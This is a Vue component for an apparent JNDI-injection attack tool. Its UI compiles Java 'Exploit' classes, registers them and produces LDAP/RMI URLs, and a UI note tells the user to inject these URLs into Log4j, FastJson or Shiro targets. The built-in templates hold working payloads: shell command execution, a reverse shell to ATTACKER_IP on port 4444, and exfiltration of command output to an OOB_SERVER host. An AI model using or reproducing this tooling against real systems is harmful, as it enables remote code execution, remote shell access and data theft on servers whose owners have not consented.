<template>
  <div class="cl-layout">
    <!-- Left: editor panel -->
    <div class="cl-editor">
      <div class="cl-section-title">Java 源码编译器</div>

      <a-row :gutter="8" style="margin-bottom:10px">
        <a-col :span="14">
          <a-input
            v-model:value="form.class_name"
            placeholder="类名 (留空自动识别)"
            size="small"
            style="font-family:monospace"
          />
        </a-col>
        <a-col :span="10">
          <a-select v-model:value="form.template" size="small" style="width:100%" @change="applyTemplate">
            <a-select-option value="exec">命令执行</a-select-option>
            <a-select-option value="reverse">反弹 Shell</a-select-option>
            <a-select-option value="curl">HTTP 外带</a-select-option>
            <a-select-option value="empty">空白模板</a-select-option>
          </a-select>
        </a-col>
      </a-row>

      <textarea
        v-model="form.source"
        class="java-editor"
        spellcheck="false"
        autocomplete="off"
        autocorrect="off"
        @input="autoDetectClass"
      />

      <a-button
        type="primary"
        block
        :loading="compiling"
        @click="doCompile"
        style="margin-top:10px"
      >
        <CodeOutlined /> 编译 Class
      </a-button>
    </div>

    <!-- Right: result panel -->
    <div class="cl-result">
      <template v-if="error">
        <a-card :bordered="false" size="small" class="cl-card">
          <template #title><span style="color:#ff4d4f">编译错误</span></template>
          <pre class="error-pre">{{ error }}</pre>
        </a-card>
      </template>

      <template v-else-if="compiled">
        <a-card :bordered="false" size="small" class="cl-card">
          <template #title>
            <span style="font-weight:600">编译成功</span>
            <a-tag color="green" style="margin-left:8px;font-family:monospace;font-size:11px">
              {{ compiled.class_name }}
            </a-tag>
          </template>
          <template #extra>
            <a-space size="small">
              <a-button size="small" @click="downloadClass">下载 .class</a-button>
              <a-button size="small" @click="copy(compiled.bytecode_b64)">复制 Base64</a-button>
            </a-space>
          </template>

          <a-textarea
            :value="compiled.bytecode_b64"
            :rows="4"
            read-only
            style="font-family:monospace;font-size:11px;background:#f6f8fa;margin-bottom:16px"
          />

          <!-- Register to JNDI token -->
          <a-divider orientation="left" plain style="font-size:12px;margin:8px 0">注册到 JNDI Token</a-divider>
          <a-row :gutter="8" style="margin-bottom:10px">
            <a-col :span="16">
              <a-select
                v-model:value="regToken"
                allow-clear
                placeholder="选择 Token"
                size="small"
                style="width:100%"
              >
                <a-select-option v-for="t in tokens" :key="t.token" :value="t.token">
                  <span style="font-family:monospace;font-size:12px">{{ t.token }}</span>
                  <span v-if="t.label" style="color:#8c8c8c;font-size:11px"> — {{ t.label }}</span>
                </a-select-option>
              </a-select>
            </a-col>
            <a-col :span="8">
              <a-button
                type="primary"
                size="small"
                block
                :loading="registering"
                :disabled="!regToken"
                @click="doRegister"
              >
                注册 & 获取 URL
              </a-button>
            </a-col>
          </a-row>

          <template v-if="jndiUrls">
            <div style="display:flex;flex-direction:column;gap:8px">
              <div style="display:flex;gap:8px;align-items:center">
                <a-tag color="orange" style="min-width:52px;text-align:center;flex-shrink:0;font-family:monospace">LDAP</a-tag>
                <a-input
                  :value="jndiUrls.ldap_url"
                  read-only
                  size="small"
                  style="font-family:monospace;font-size:11px"
                />
                <a-button size="small" type="primary" ghost @click="copy(jndiUrls.ldap_url)">复制</a-button>
              </div>
              <div style="display:flex;gap:8px;align-items:center">
                <a-tag color="red" style="min-width:52px;text-align:center;flex-shrink:0;font-family:monospace">RMI</a-tag>
                <a-input
                  :value="jndiUrls.rmi_url"
                  read-only
                  size="small"
                  style="font-family:monospace;font-size:11px"
                />
                <a-button size="small" type="primary" ghost @click="copy(jndiUrls.rmi_url)">复制</a-button>
              </div>
            </div>
            <div style="margin-top:10px;font-size:12px;color:#8c8c8c">
              将上方 URL 注入到目标应用的 JNDI 入口（Log4j、FastJson、Shiro 等），目标 JVM 会加载并执行该 Class。
            </div>
          </template>
        </a-card>
      </template>

      <div v-else class="cl-empty">
        <a-empty>
          <template #description>
            <div style="color:#bfbfbf;font-size:13px">
              <p>编写 Java 源码 → 编译 → 注册 Token → 获取 JNDI URL</p>
              <div class="tip-grid">
                <div class="tip-item"><span class="tip-badge step">1</span> 选择模板或编写源码</div>
                <div class="tip-item"><span class="tip-badge step">2</span> 点击「编译 Class」</div>
                <div class="tip-item"><span class="tip-badge step">3</span> 选择 Token 并注册</div>
                <div class="tip-item"><span class="tip-badge step">4</span> 复制 LDAP/RMI URL 注入</div>
              </div>
            </div>
          </template>
        </a-empty>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { message } from 'ant-design-vue'
import { CodeOutlined } from '@ant-design/icons-vue'
import { compileJava, setRebind, listTokens } from '../api'

const TEMPLATES: Record<string, { class_name: string; source: string }> = {
  exec: {
    class_name: 'Exploit',
    source: `public class Exploit {
    static {
        try {
            String cmd = "id";
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        } catch (Exception ignored) {}
    }
}`,
  },
  reverse: {
    class_name: 'Exploit',
    source: `import java.net.*;
import java.io.*;

public class Exploit {
    static {
        try {
            String host = "ATTACKER_IP";
            int port = 4444;
            Socket s = new Socket(host, port);
            Process p = Runtime.getRuntime().exec("/bin/sh");
            InputStream pi = p.getInputStream(), pe = p.getErrorStream();
            OutputStream si = s.getOutputStream();
            InputStream so = s.getInputStream();
            new Thread(() -> { try { pipe(pi, si); } catch (Exception ignored) {} }).start();
            new Thread(() -> { try { pipe(pe, si); } catch (Exception ignored) {} }).start();
            new Thread(() -> { try { pipe(so, p.getOutputStream()); } catch (Exception ignored) {} }).start();
        } catch (Exception ignored) {}
    }
    static void pipe(InputStream i, OutputStream o) throws Exception {
        byte[] b = new byte[1024]; int n;
        while ((n = i.read(b)) != -1) o.write(b, 0, n);
    }
}`,
  },
  curl: {
    class_name: 'Exploit',
    source: `import java.net.*;
import java.io.*;

public class Exploit {
    static {
        try {
            String cmd = "id";
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            String output = URLEncoder.encode(sb.toString(), "UTF-8");
            URL url = new URL("http://OOB_SERVER/" + output);
            url.openConnection().getInputStream().read();
        } catch (Exception ignored) {}
    }
}`,
  },
  empty: {
    class_name: 'Exploit',
    source: `public class Exploit {
    static {
        // write your exploit here
    }
}`,
  },
}

const form = ref({ class_name: 'Exploit', source: TEMPLATES.exec.source, template: 'exec' })
const compiling = ref(false)
const registering = ref(false)
const compiled = ref<any>(null)
const error = ref('')
const regToken = ref('')
const jndiUrls = ref<any>(null)
const tokens = ref<any[]>([])

function applyTemplate(tpl: string) {
  const t = TEMPLATES[tpl]
  if (t) {
    form.value.source = t.source
    form.value.class_name = t.class_name
    compiled.value = null
    error.value = ''
    jndiUrls.value = null
  }
}

function autoDetectClass() {
  const m = form.value.source.match(/(?:^|\s)public\s+class\s+(\w+)/)
  if (m) form.value.class_name = m[1]
}

async function doCompile() {
  compiling.value = true
  compiled.value = null
  error.value = ''
  jndiUrls.value = null
  try {
    const { data } = await compileJava({
      source: form.value.source,
      class_name: form.value.class_name || undefined,
    })
    compiled.value = data
    message.success('编译成功: ' + data.class_name)
  } catch (e: any) {
    error.value = e.response?.data?.detail || e.response?.data?.error || e.message
  } finally {
    compiling.value = false
  }
}

async function doRegister() {
  if (!compiled.value || !regToken.value) return
  registering.value = true
  jndiUrls.value = null
  try {
    const { data } = await setRebind(regToken.value, {
      class_name: compiled.value.class_name,
      bytecode_b64: compiled.value.bytecode_b64,
    })
    jndiUrls.value = data
    message.success('已注册，JNDI URL 已生成')
  } catch (e: any) {
    message.error(e.response?.data?.detail || e.message)
  } finally {
    registering.value = false
  }
}

function copy(v: string) { navigator.clipboard.writeText(v); message.success('已复制') }

function downloadClass() {
  if (!compiled.value?.bytecode_b64) return
  const bin = atob(compiled.value.bytecode_b64)
  const bytes = new Uint8Array(bin.length)
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i)
  const a = document.createElement('a')
  a.href = URL.createObjectURL(new Blob([bytes], { type: 'application/java-vm' }))
  a.download = (compiled.value.class_name || 'Exploit') + '.class'
  a.click()
}

onMounted(async () => { tokens.value = (await listTokens()).data })
</script>

<style scoped>
.cl-layout { display: flex; gap: 12px; height: calc(100vh - 110px); }

.cl-editor {
  width: 380px;
  flex-shrink: 0;
  background: #fff;
  border-radius: 8px;
  border: 1px solid #f0f0f0;
  padding: 16px;
  display: flex;
  flex-direction: column;
}

.cl-section-title {
  font-size: 12px;
  font-weight: 600;
  color: #8c8c8c;
  text-transform: uppercase;
  letter-spacing: .5px;
  margin-bottom: 12px;
}

.java-editor {
  flex: 1;
  min-height: 400px;
  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
  font-size: 12px;
  line-height: 1.5;
  background: #1e1e1e;
  color: #d4d4d4;
  border: 1px solid #404040;
  border-radius: 4px;
  padding: 10px 12px;
  resize: none;
  outline: none;
  tab-size: 4;
}
.java-editor:focus { border-color: #1677ff; }

.cl-result {
  flex: 1;
  overflow-y: auto;
  min-width: 0;
}
.cl-result::-webkit-scrollbar { width: 4px; }
.cl-card {
  background: #fff;
  border-radius: 8px;
  border: 1px solid #f0f0f0;
}
.cl-empty {
  height: 100%;
  background: #fff;
  border-radius: 8px;
  border: 1px solid #f0f0f0;
  display: flex;
  align-items: center;
  justify-content: center;
}

.error-pre {
  font-family: monospace;
  font-size: 12px;
  color: #ff4d4f;
  white-space: pre-wrap;
  word-break: break-all;
  background: #fff2f0;
  border: 1px solid #ffccc7;
  border-radius: 4px;
  padding: 10px;
  max-height: 300px;
  overflow-y: auto;
}

.tip-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 12px; text-align: left; }
.tip-item { font-size: 12px; display: flex; align-items: center; gap: 6px; }
.tip-badge.step {
  background: #e6f4ff;
  color: #0958d9;
  padding: 2px 7px;
  border-radius: 10px;
  font-size: 11px;
  font-weight: 700;
  flex-shrink: 0;
}
</style>
